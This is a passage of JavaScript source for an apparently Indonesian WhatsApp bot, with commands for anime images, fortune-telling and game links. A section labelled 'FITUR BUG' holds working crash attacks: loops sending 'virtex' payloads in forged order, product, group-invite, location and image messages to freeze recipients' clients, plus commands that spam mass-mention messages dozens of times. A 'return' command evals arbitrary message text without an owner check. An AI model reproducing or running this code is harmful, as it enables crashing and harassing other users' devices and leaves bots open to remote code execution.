					setReply(mess.wait)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
				
				     
                     case 'neko':
                     case 'shinobu':
                     case 'megumin':
				     case 'bully':
                     case 'cuddle':
                     case 'cry':
                     case 'hug':
				     case 'awoo':
                     case 'kiss':
                     case 'lick':
                     case 'pat':
				     case 'smug':
                     case 'bonk':
                     case 'yeet':
                     case 'blush':
                     case 'wave':
                     case 'highfive':
                     case 'handhold':
				     case 'nom':
                     case 'bite':
                     case 'glomp':
                     case 'slaps':
				     case 'kill':
                     case 'happy':
                     case 'wink':
					setReply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					case 'waifunime':
					setReply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					
					
					
					case 'baka':
					case 'hug':
					case 'kemonomimi':
					case 'holo':
					setReply(mess.wait)
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
	
				
							
case 'bkingc':
			  if (isBanned) return reply(mess.ban)
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}bkingc nama grup|@tag member`)
				q = arg.split('.')
				if (iky.message.extendedTextMessage != undefined){
                    mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						woy = []
						woy.push(mentioned[i])
                    }
					ikyc.groupCreate(argz[0], woy)
					reply(`Sukses membuat grup ${q}`)
                }
				break										
													
																
																			
																						
																									
																												
																																		
case 'megumip':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
yuzk = await getBuffer(`http://api-helgazex.herokuapp.com/api/megumin?apikey=himaru}`)
ikyc.sendMessage(from, yuzk, image, { quoted: iky, caption: 'Nih Kak', thumbnail: fs.readFileSync('./helga.jpg')})
break	
	
	//PRIMBON
	case 'artinama':
	try{
	if(!q) return setReply("Namanya apa kak ?")
	primbon.artiNama(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'artimimpi':
try{
if(!q) return setReply("Mimpi apa semalem ?")
primbon.tafsirMimpi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'namapasangan':
try{
if(!q) return setReply("Namanya siapa kak ? Contoh jajas titin")
if(args.length < 2) return setReply("Masukan nama pasangan Contoh jajas titin")
if(args.length > 2) return setReply("Masukan nama pasangan Contoh jajas titin")
primbon.Jodoh(args[0],args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'tanggaljadian':
try{
if(!q) return setReply("Tanggal berapa kak ? Contoh 01-07-2000")
primbon.tanggaljadi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break
case 'tipewatak':
try{
if(!q) return setReply("Teksnya ? Contoh nih Michelle Ziudith 20-1-1995")
if(args.length < 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
if(args.length > 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
primbon.watakartis(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break
case 'ramalanjodoh':
try{
if(!q) return setReply(" Teksnya ? Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length < 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length > 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
primbon.ramalanjodoh(args[0], args[1], args[2],args[3]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanrejeki':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 11-1-2000")
primbon.rejekiweton(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'kecocokannama':
try{
if(!q) return setReply("Tanggalny mana kak Contoh angel 18-5-20005")
if(args.length < 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
if(args.length > 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
primbon.kecocokannama(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'haribaik':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 1-1-2000")
primbon.haribaik(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'harilarangan':
try{
if(!q) return setReply("Tanggal nya mana kak Contoh 1-1-2000")
primbon.harilarangan(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break








	
	case 'bullyuk':
	if(!autoWelcome){
     if(!isWelkom) return setReply("Erro")
     }
     if(isZadani) return
     setReply(`Hayuk ah`)
     setTimeout(() => {
      sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
                      {buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
                      {buttonId: `${prefix}${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
           }, 2000)
           break
case 'picdetec': case 'picdetect':
	if (!isOwner) return onlyOwner()
if ((args[0]) === 'on'){
if(picdetec)return reply('_Fitur sudah diaktifkan sebelumnya!_')
picdetec = true
reply('*_Succses_*')
} else if ((args[0]) === 'off'){
if(!picdetec)return reply('_Fitur sudah diaktifkan sebelumnya!_')
picdetec = false
reply('*_Succses_*')
}else{
reply(`*Format Error!*\n\n*Example :*\n ▪︎ ${prefix + command} on\n ▪︎ ${prefix + command} off\n\n*Note :*\n • _On : Untuk Me-Aktifkan!_\n • _Off : Untuk Me-NonAktifkan!_`)
}
break	
case 'info1':
reply(`🐳 = $200
🦈 = $121
🐬 = $104
🐋 = $94
🐟 = $87
🐠 = $79
🦐 = $62
🦑 = $34
🦀 = $17
🐚 = $2
NOTE : TETAPLAH BERBURU KAWAN. WALAUPUN TIDAK BERGUNA SEPERTI ANDA`)
break
case 'info2':
reply(`🐔 = $200
🦃 = $121
🐿 = $104
🐐 = $94
🐏 = $87
🐖 = $79
🐑 = $62
🐎 = $34
🐺 = $17
🦩 = $2
*NOTE* : TETAPLAH BERBURU KAWAN. WALAUPUN TIDAK BERGUNA SEPERTI ANDA`)
break
case 'info3':
reply(`🦋 = $200
🕷 = $121
🐝 = $104
🐉 = $94
🦆 = $87
🦅 = $79
🕊 = $62
🐧 = $34
🐦 = $17
🦇 = $2
NOTE : TETAPLAH BERBURU KAWAN. WALAUPUN TIDAK BERGUNA SEPERTI ANDA`)
break
case 'ikyganteng':
  if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
var syahiry = randomNomor(150)
addBalance(sender, syahiry, balance)
slop = `*GAME BILANG IKY GTG*
Selamat  kamu Telah Mengakui Ke Gantengan Iky\nHadiah : $${syahiry}`
but = [{ buttonId: `!ikyganteng`, buttonText: { displayText: 'Lagi' }, type: 1 }]
          sendButton(from, slop, 'Dapet Balance Cie', but)
gameAdd(sender, glimit)
break
case 'namaku':
slom = `𝙉𝘼𝙈𝘼 𝙈𝙐 𝘼𝘿𝘼𝙇𝘼𝙃
> ${pushname}`
but = [{ buttonId: `!namaku`, buttonText: { displayText: 'Lagi' }, type: 1 }]
          sendButton(from, slom, 'Namalo', but)
break
case 'say':
  if (isBanned) return reply(mess.ban)
teks = body.slice(5)
if (args.length < 1) return reply('teksnya mana kak?')
saying = teks
ikyc.sendMessage(from, saying, text, {quoted: fhidetag})
break
case 'tanggal':
reply(`𝘚𝘌𝘒𝘈𝘙𝘈𝘕𝘎 𝘛𝘈𝘕𝘎𝘎𝘈𝘓
> ${Tanggals}`)
break
case 'game1':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://taptopfun.com/Moto_Racing/index.html?utm_source=launcher_instantapp8
Name Game : Moto Racing
Lest Play The Game <3`)
break
case 'game2':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.huntgame.top/chuanyin/BIKERACING3.html?utm_source=launcher_instantapp7
Name Game : Bike Racing 3
Lest Play The Game <3`)
break
case 'game3':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71332&utm_source=launcher_instantapp6
Name Game : Free Kick 3D
Lest Play The Game <3`)
break
case 'game4':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=69475&utm_source=launcher_instantapp2
Name Game : Crazy Archer
Lest Play The Game <3`)
break
case 'game5':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71387&utm_source=launcher_instantapp3
Name Game : Crazy Racing
Lest Play The Game <3`)
break
case 'game6':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=49397&utm_source=launcher_instantapp1
Name Game : Adventure Skateboard
Lest Play The Game <3`)
break
case 'game7':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71406&utm_source=launcher_instantapp8
Name Game : Warzone
Lest Play The Game <3`)
break
case 'game8':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71169&utm_source=launcher_instantapp3
Name Game. : Tactical Squad
Lest Play The Game <3`)
break
case 'game9':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=70905&utm_source=launcher_instantapp4
Name Game : Castle Defend
Lest Play The Game <3`)
break
case 'game10':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=65301&utm_source=discovery
Name Game : Save Girl
Lest Play The Game <3`)
break
case 'game11':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?utm_source=Launcher_instantapp_fun&id=54338&lang=en
Name Game : Bike Racing
Lest Play The Game <3`)
break
case 'game12':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=70477&utm_source=launcher_instantapp5
Name Game : Sonic Clash
Lest Play The Game <3`)
break
case 'game13':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.afth5.com/games/aftgchy/games/MrJackVsZombies/?utm_source=launcher_instantapp8
Name Game : Jack Vs Zombie
Lest Play The Game <3`)
break
case 'game14':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=70368&utm_source=launcher_instantapp7
Name Game : Crowd Run
Lest Play The Game <3`)
break
case 'game15':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=70995&nicktype=self&utm_source=launcher_instantapp5
Name Game : Hungry Game
Lest Play The Game <3`)
break
case 'game16':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71027&utm_source=launcher_instantapp1
Name Game : Sky Racing
Lest Play The Game <3`)
break
case 'game17':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71184&utm_source=launcher_instantapp2
Name Game : Cop Case
Lest Play The Game <3`)
break
case 'game18':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=71017&utm_source=launcher_instantapp7
Name Game : Truck
Lest Play The Game <3`)
break
case 'game19':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=65749&utm_source=discovery
Name Game : Sweet Candy
Lest Play The Game <3`)
break
case 'game20':
reply(`𝙊𝙋𝙀𝙉 𝙏𝙃𝙀 𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀
𝙆𝙡𝙞𝙠 𝙆𝙖𝙠 > https://www.hippoobox.com/game-detail?id=65917&utm_source=discovery
Name Game : Monster Truck
Lest Play The Game <3`)
break
               case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    setReply( text1 + readmore + text2)
                    break
  
  	
	
	
	
//-------------------------------》FITUR BUG《-------------------------------\\
	
case 'kirin':
      if(isZadani) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           ikyc.sendMessage(from, {
                        'groupName': fake,
                        'groupJid': '6289699472590-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })        
           }
           break
 
 
 
 case 'katsu':
      if(isZadani) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           ikyc.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: forward})
                             
           }
           break
case 'h10':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(isZadani) return
			if (!isGroup) return setReply(mess.only.group)
			var value = args.join(' ')
			var group = await ikyc.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: iky
			}
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			break  
case 'h100':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(isZadani) return
			if (!isGroup) return setReply(mess.only.group)
			var value = args.join(' ')
			var group = await ikyc.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: iky
			}
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
            ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			ikyc.sendMessage(from, optionshidetag, text)
			break            
case 'return':
				      if(isZadani) return
					return ikyc.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: fhidetag})
					if (err) return ikyc.sendMessage(from, `root @Ikyc:~ ${err}`, text, { quoted: iky })
                 break           
           case 'kamui':
                if(isZadani) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirin = ikyc.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 ikyc.relayWAMessage(kirin)
                             
           }
           break
 
 
 
 
	
	
	case 'amaterasu':
     if(isZadani) return
      if (!isOwner) return onlyOwner()
{
var kirim = ikyc.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': philip(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 ikyc.relayWAMessage(kirim)
                 
                 
                 
         ikyc.sendMessage(from, virtex8(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
                })
                
                
                ikyc.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6289699472590-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    })        
                
                
                ikyc.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
                             hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await ikyc.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await ikyc.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': {
                                'forwardingScore': 100000000,
                                'isForwarded': true,
                                'sendEphemeral': true
                            }
                        }
                    }, {
                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    }), 
                  ikyc.relayWAMessage(res)
                             
                             
                             
                    
                    const nana = fs.readFileSync('./stik/trava.jpg');
                        ikyc.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        
                        
                        var kirin = ikyc.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 ikyc.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await ikyc.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': davizin,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break
           
